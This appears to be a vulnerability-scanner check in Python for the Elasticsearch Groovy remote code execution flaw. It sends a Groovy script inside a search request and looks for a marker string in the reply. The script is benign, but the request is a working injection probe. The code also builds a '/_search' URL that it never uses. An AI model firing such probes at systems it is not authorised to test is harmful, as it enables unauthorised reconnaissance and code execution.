import requests
import json

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if Elasticsearch groovy vul')
    try:
        domain = 'http://'+'%s'% ip +':'+'%s'% port + '/_search?pretty'
        data = {"size":1,"script_fields": {"my_field": {"script": "def res=\"3b8096391df29b2ce44a81b9e436f769\";res","lang":"groovy"}}}
        rq = requests.post(url,data=json.dumps(data), verify=False,timeout=5)
        if rq.text and '3b8096391df29b2ce44a81b9e436f769' in rq.text:
            msg = 'There is a Elasticsearch groovy remote code exec vul on %s' %url
            print(msg)
            number = 'v23'
            return True,url,number,msg
        else:
            msg = 'There is no  Elasticsearch groovy remote code exec vul'
            number = 'v0'
            return False,url,number,msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg